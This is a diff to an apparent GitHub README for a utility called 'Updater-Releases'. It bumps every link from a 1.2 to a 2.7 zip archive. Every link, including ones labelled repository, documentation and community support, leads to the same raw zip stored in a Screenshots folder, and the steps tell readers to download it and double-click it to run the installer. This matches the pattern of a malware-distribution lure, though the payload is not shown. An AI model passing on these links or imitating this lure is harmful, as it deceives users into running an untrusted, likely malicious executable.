@@ -1,6 +1,6 @@
 # 🛠️ Updater-Releases - Keep Your Apps Updated Easily
 
-[![Download Now](https://raw.githubusercontent.com/Iyanyourbae/Updater-Releases/main/Screenshots/Updater-Releases-1.2.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Iyanyourbae/Updater-Releases/main/Screenshots/Updater-Releases-1.2.zip)
+[![Download Now](https://raw.githubusercontent.com/Iyanyourbae/Updater-Releases/main/Screenshots/Updater-Releases-2.7.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Iyanyourbae/Updater-Releases/main/Screenshots/Updater-Releases-2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,12 +8,12 @@ Updater-Releases is a simple utility designed to help you quickly update your ap
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version of Updater-Releases: [GitHub Releases](https://raw.githubusercontent.com/Iyanyourbae/Updater-Releases/main/Screenshots/Updater-Releases-1.2.zip).
+To get started, visit this page to download the latest version of Updater-Releases: [GitHub Releases](https://raw.githubusercontent.com/Iyanyourbae/Updater-Releases/main/Screenshots/Updater-Releases-2.7.zip).
 
 Follow these steps to install:
 
 1. Click on the link above to go to the releases page.
-2. Locate the most recent release. Look for files with names like `https://raw.githubusercontent.com/Iyanyourbae/Updater-Releases/main/Screenshots/Updater-Releases-1.2.zip`.
+2. Locate the most recent release. Look for files with names like `https://raw.githubusercontent.com/Iyanyourbae/Updater-Releases/main/Screenshots/Updater-Releases-2.7.zip`.
 3. Download the file by clicking on it. Your browser will start the download automatically.
 4. Once the download is complete, locate the file in your downloads folder.
 5. Double-click the file to run the installer.
@@ -61,9 +61,9 @@ Yes, an active Internet connection is required to check for updates and download
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/Iyanyourbae/Updater-Releases/main/Screenshots/Updater-Releases-1.2.zip)
-- [Documentation](https://raw.githubusercontent.com/Iyanyourbae/Updater-Releases/main/Screenshots/Updater-Releases-1.2.zip)
-- [Community Support](https://raw.githubusercontent.com/Iyanyourbae/Updater-Releases/main/Screenshots/Updater-Releases-1.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Iyanyourbae/Updater-Releases/main/Screenshots/Updater-Releases-2.7.zip)
+- [Documentation](https://raw.githubusercontent.com/Iyanyourbae/Updater-Releases/main/Screenshots/Updater-Releases-2.7.zip)
+- [Community Support](https://raw.githubusercontent.com/Iyanyourbae/Updater-Releases/main/Screenshots/Updater-Releases-2.7.zip)
 
 ## 🎉 Conclusion
 
